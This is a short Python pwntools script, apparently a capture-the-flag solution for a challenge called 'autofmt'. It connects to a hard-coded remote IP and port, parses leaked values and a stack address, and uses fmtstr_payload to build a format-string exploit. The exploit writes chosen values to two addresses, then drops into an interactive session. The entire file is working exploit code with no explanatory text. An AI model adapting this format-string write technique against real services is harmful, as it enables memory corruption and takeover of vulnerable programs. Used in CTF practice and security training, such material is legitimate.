from pwn import *


# p = process('./autofmt')

p = remote('45.122.249.68', 10015)

p.recvline()

context.clear(arch='amd64')

aValue = int(p.recvline()[4:-1])
bValue = int(p.recvline()[4:-1])
aAddr = int(p.recvline()[11:-1], 16)
bAddr = aAddr - 8

log.info(f'a Value: {hex(aValue)}')
log.info(f'b Value: {hex(bValue)}')
log.info(f'a address: {hex(aAddr)}')
log.info(f'b address: {hex(bAddr)}')

writes = {aAddr: p64(aValue),
          bAddr: p64(bValue)}

payload = fmtstr_payload(10, writes, write_size='short')

print(payload)
p.sendline(payload)

p.interactive()
